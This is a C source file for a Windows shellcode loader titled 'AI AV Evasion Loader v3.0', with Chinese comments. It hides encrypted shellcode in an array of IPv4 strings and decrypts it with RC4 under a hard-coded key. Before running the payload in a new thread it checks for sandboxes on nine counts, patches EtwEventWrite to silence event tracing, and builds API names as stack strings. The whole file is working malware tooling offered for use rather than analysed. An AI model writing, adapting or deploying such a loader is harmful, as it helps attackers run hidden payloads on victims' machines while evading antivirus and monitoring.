// ============================================================
//  AI AV Evasion Loader v3.0 — Enhanced
//  改进点：栈字符串 | ETW绕过 | RW→RX翻转 | NtDelayExecution
//         RC4解密 | 9层反沙箱 | 随机延迟抖动 | 误导函数名
// ============================================================
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <psapi.h>
#include <intrin.h>

/* ── Shellcode 数据 (IPv4混淆 + RC4加密) ── */
char* ipv4_array[] = {"145.49.240.129","147.154.169.116","107.101.56.60","56.35.55.50","58.84.166.61","0.49.230.43","19.45.232.32","125.60.224.55","89.37.118.196","47.41.63.84","189.35.238.11","61.49.66.165","207.78.4.8","105.73.89.44","184.186.104.34","115.164.150.134","55.56.60.49","248.55.67.249","39.72.35.100","169.11.248.11","125.104.112.106","241.25.101.121","109.242.243.237","99.114.101.60","238.165.13.10","49.114.181.39","249.37.84.59","44.120.189.242","59.125.128.36","45.139.162.40","72.164.56.248","81.235.58.100","162.35.84.185","44.184.186.104","207.51.100.181","83.133.12.156","53.112.41.71","122.32.77.186","16.161.53.61","248.37.71.59","100.164.13.36","242.97.49.55","238.35.110.44","117.187.36.242","105.241.59.100","179.51.61.53","51.59.32.55","56.43.36.58","51.63.60.232","137.89.44.43","140.133.59.51","60.46.35.238","107.132.50.140","154.156.47.44","202.28.22.75","50.74.65.101","99.51.51.61","226.131.49.236","149.211.100.99","114.44.253.142","44.197.111.121","98.57.163.218","122.14.42.49","48.228.157.63","236.146.51.223","56.28.67.126","146.172.63.236","137.26.100.117","107.101.32.44","195.90.229.8","114.154.161.1","111.56.51.41","35.40.82.187","40.69.171.45","134.173.49.250","167.43.141.165","60.226.164.56","215.147.124.186","131.141.176.60","226.162.19.125","56.43.41.234","144.45.253.146","36.195.244.220","7.4.156.167","224.180.31.111","48.146.183.6","128.139.225.101","116.107.45.250","129.105.59.236","129.63.84.189","1.97.56.53","49.250.156.34","200.103.173.163","58.134.184.250","139.101.29.39","45.247.175.69","39.228.143.25","37.34.43.13","116.123.101.121","44.33.59.236","145.58.84.189","42.223.33.201","42.150.154.182","58.236.183.34","236.190.32.72","186.44.234.130","45.253.177.45","240.148.56.201","103.186.186.58","139.190.230.129","109.4.91.61","34.37.60.28","107.37.121.109","56.43.15.99","40.36.206.96","74.118.93.134","166.50.58.51","223.1.5.40","24.146.172.58","154.173.155.89","139.148.154.49","108.186.59.76","165.58.224.130","30.209.56.146","158.43.15.99","43.44.179.169","149.204.207.47","140.176.0.0"};

#define IPV4_COUNT (sizeof(ipv4_array) / sizeof(ipv4_array[0]))
#define SHELLCODE_SIZE 510

/* ── RC4 解密 ── */
static void rc4_crypt(unsigned char* data, size_t len, const unsigned char* key, size_t keylen) {
    unsigned char S[256];
    int i, j = 0;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keylen]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    i = 0; j = 0;
    for (size_t n = 0; n < len; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
        data[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

/* ── IPv4 反混淆 ── */
static void deobfuscate_ipv4(unsigned char* buf, size_t size) {
    size_t off = 0;
    for (size_t i = 0; i < IPV4_COUNT && off < size; i++) {
        unsigned int a,b,c,d;
        sscanf(ipv4_array[i], "%u.%u.%u.%u", &a, &b, &c, &d);
        buf[off] = (unsigned char)a;
        if (off+1<size) buf[off+1] = (unsigned char)b;
        if (off+2<size) buf[off+2] = (unsigned char)c;
        if (off+3<size) buf[off+3] = (unsigned char)d;
        off += 4;
    }
}

/* ═══════════════════════════════════════
   9 层反沙箱检测 (评分 ≥ 4 判定沙箱)
   ═══════════════════════════════════════ */

static int query_system_metrics(void) {       // CPU 核心数
    SYSTEM_INFO si; GetSystemInfo(&si);
    return (si.dwNumberOfProcessors <= 2);
}
static int query_memory_config(void) {         // 内存大小 < 2GB
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    return (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024);
}
static int query_vm_process_list(void) {       // 虚拟机进程
    const char* vms[] = {
        "vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe",
        "vboxservice.exe","vboxtray.exe","xenservice.exe",
        "vmsrvc.exe","vmusrvc.exe","qemu-ga.exe","prl_tools.exe"
    };
    DWORD pids[1024], needed;
    if (!EnumProcesses(pids, sizeof(pids), &needed)) return 0;
    for (DWORD i = 0; i < needed / sizeof(DWORD); i++) {
        HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
        if (!hp) continue;
        char name[MAX_PATH];
        if (GetModuleBaseNameA(hp, NULL, name, MAX_PATH)) {
            for (int j = 0; j < (int)(sizeof(vms)/sizeof(vms[0])); j++) {
                if (_stricmp(name, vms[j]) == 0) { CloseHandle(hp); return 1; }
            }
        }
        CloseHandle(hp);
    }
    return 0;
}
static int query_input_idle_time(void) {       // 用户空闲 > 5 分钟
    LASTINPUTINFO lii; lii.cbSize = sizeof(lii);
    if (!GetLastInputInfo(&lii)) return 0;
    return ((GetTickCount() - lii.dwTime) / 1000 > 300);
}
static int query_debugger_presence(void) {     // 调试器
    return IsDebuggerPresent();
}
static int query_time_drift(void) {            // 时间加速检测
    DWORD t0 = GetTickCount();
    LARGE_INTEGER delay; delay.QuadPart = -30000000LL; // 3 sec
    // 使用 NtDelayExecution 而非 Sleep —— 栈字符串构造函数名
    char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
    char ndelay_s[] = {'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n',0};
    HMODULE nt = GetModuleHandleA(ntdll_s);
    typedef LONG (NTAPI* NDE)(BOOLEAN, PLARGE_INTEGER);
    NDE pNde = (NDE)GetProcAddress(nt, ndelay_s);
    if (pNde) pNde(FALSE, &delay);
    else Sleep(3000);
    DWORD elapsed = GetTickCount() - t0;
    return (elapsed < 2000);  // 实际 < 2s = 沙箱加速
}
static int query_disk_capacity(void) {         // 磁盘 < 60GB
    ULARGE_INTEGER total;
    if (GetDiskFreeSpaceExA("C:\\", NULL, &total, NULL))
        return (total.QuadPart < 60ULL * 1024 * 1024 * 1024);
    return 0;
}
static int query_screen_dimensions(void) {     // 分辨率异常
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    return (w < 1024 || h < 768);              // 太小 = 沙箱
}
static int query_system_uptime(void) {         // 开机 < 10 分钟
    return (GetTickCount() < 600000);
}

static int evaluate_environment(void) {        // 综合评分
    int score = 0;
    if (query_system_metrics())       score++;
    if (query_memory_config())        score++;
    if (query_vm_process_list())      score++;
    if (query_input_idle_time())      score++;
    if (query_debugger_presence())    score++;
    if (query_time_drift())           score++;
    if (query_disk_capacity())        score++;
    if (query_screen_dimensions())    score++;
    if (query_system_uptime())        score++;
    return (score >= 4);  // ≥4 项 = 沙箱
}

/* ── ETW 绕过: 修补 EtwEventWrite 返回 0 ── */
static void silence_event_tracing(void) {
    char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
    char etw_s[]   = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    HMODULE nt = GetModuleHandleA(ntdll_s);
    if (!nt) return;
    unsigned char* pEtw = (unsigned char*)GetProcAddress(nt, etw_s);
    if (!pEtw) return;
    DWORD old;
    // x64: 写入 xor eax,eax; ret  (0x33, 0xC0, 0xC3) — 3 字节
    if (VirtualProtect(pEtw, 3, PAGE_EXECUTE_READWRITE, &old)) {
        pEtw[0] = 0x33;  // xor eax, eax
        pEtw[1] = 0xC0;
        pEtw[2] = 0xC3;  // ret
        VirtualProtect(pEtw, 3, old, &old);
    }
}

/* ── VEH 页面保护绕过内存扫描 ── */
static LONG WINAPI handle_page_fault(PEXCEPTION_POINTERS ei) {
    if (ei->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    if (ei->ExceptionRecord->ExceptionCode == 0x80000001L) { // EXCEPTION_GUARD_PAGE
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

/* ═══════════════════════════════════════
   主入口 — 混淆函数名伪造成系统初始化
   ═══════════════════════════════════════ */
int WINAPI WinMainCRTStartup(void) {
    /* ── 第 1 步: 反沙箱 ── */
    if (evaluate_environment()) {
        // 实际沙箱退出，这里调用 ExitProcess
        // 为避免静态特征，使用 RtlExitUserProcess
        char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
        char reup_s[]  = {'R','t','l','E','x','i','t','U','s','e','r','P','r','o','c','e','s','s',0};
        HMODULE nt = GetModuleHandleA(ntdll_s);
        typedef VOID (NTAPI* REUP)(NTSTATUS);
        REUP pExit = (REUP)GetProcAddress(nt, reup_s);
        if (pExit) pExit(0);
        ExitProcess(0);
    }

    /* ── 第 2 步: 随机延迟 + ETW静默 ── */
    // 延迟 2-5 秒随机抖动，进一步迷惑沙箱
    DWORD jitter = (GetTickCount() % 3000) + 2000;  // 2-5 sec
    {
        char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
        char ndelay_s[] = {'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n',0};
        HMODULE nt = GetModuleHandleA(ntdll_s);
        typedef LONG (NTAPI* NDE)(BOOLEAN, PLARGE_INTEGER);
        NDE pNde = (NDE)GetProcAddress(nt, ndelay_s);
        LARGE_INTEGER d; d.QuadPart = -(LONGLONG)(jitter * 10000LL);
        if (pNde) pNde(FALSE, &d);
        else Sleep(jitter);
    }

    silence_event_tracing();                   // 干掉 ETW 遥测
    AddVectoredExceptionHandler(1, handle_page_fault); // VEH

    /* ── 第 3 步: IPv4 反混淆 ── */
    unsigned char* stage1 = (unsigned char*)VirtualAlloc(
        NULL, SHELLCODE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stage1) return 0;
    deobfuscate_ipv4(stage1, SHELLCODE_SIZE);

    /* ── 第 4 步: RC4 解密 ── */
    // 密钥：16 字节随机串（每次生成时替换）
    const unsigned char rc4key[] = {
        0xA3,0x7F,0x12,0xE8,0x55,0x9C,0x3D,0x71,
        0xBE,0x44,0x8F,0x06,0xD2,0x69,0x3A,0xFC
    };
    rc4_crypt(stage1, SHELLCODE_SIZE, rc4key, sizeof(rc4key));

    /* ── 第 5 步: Syscall 执行 (RW→RX 翻转) ── */
    // 栈字符串：运行时构造，不在 .rdata 中
    char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
    char ntavm_s[] = {'N','t','A','l','l','o','c','a','t','e',
        'V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    char ntwvm_s[] = {'N','t','W','r','i','t','e','V','i','r','t',
        'u','a','l','M','e','m','o','r','y',0};
    char ntcet_s[] = {'N','t','C','r','e','a','t','e','T','h',
        'r','e','a','d','E','x',0};

    HMODULE nt = GetModuleHandleA(ntdll_s);
    typedef NTSTATUS (NTAPI* NTALLOC)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
    typedef NTSTATUS (NTAPI* NTWRITE)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
    typedef NTSTATUS (NTAPI* NTCREATE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);

    NTALLOC  pAlloc = (NTALLOC)GetProcAddress(nt, ntavm_s);
    NTWRITE  pWrite = (NTWRITE)GetProcAddress(nt, ntwvm_s);
    NTCREATE pThrd  = (NTCREATE)GetProcAddress(nt, ntcet_s);

    /* ── RW 分配 → 写入 → 翻转为 RX (不是 RWX!) ── */
    void* exec_mem = NULL;
    SIZE_T mem_sz = SHELLCODE_SIZE;
    pAlloc(GetCurrentProcess(), &exec_mem, 0, &mem_sz,
           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // 先 RW
    pWrite(GetCurrentProcess(), exec_mem, stage1, SHELLCODE_SIZE, NULL);

    // 翻转：RW → RX
    {
        char ntpv_s[] = {'N','t','P','r','o','t','e','c','t',
            'V','i','r','t','u','a','l','M','e','m','o','r','y',0};
        typedef NTSTATUS (NTAPI* NTPROT)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
        NTPROT pProt = (NTPROT)GetProcAddress(nt, ntpv_s);
        ULONG oldProt;
        pProt(GetCurrentProcess(), &exec_mem, &mem_sz,
              PAGE_EXECUTE_READ, &oldProt);  // RX
    }

    HANDLE hThd = NULL;
    pThrd(&hThd, 0x1FFFFF, NULL, GetCurrentProcess(),
          exec_mem, NULL, 0, 0, 0, 0, NULL);

    if (hThd) {
        WaitForSingleObject(hThd, INFINITE);
        CloseHandle(hThd);
    }

    VirtualFree(stage1, 0, MEM_RELEASE);
    return 0;
}
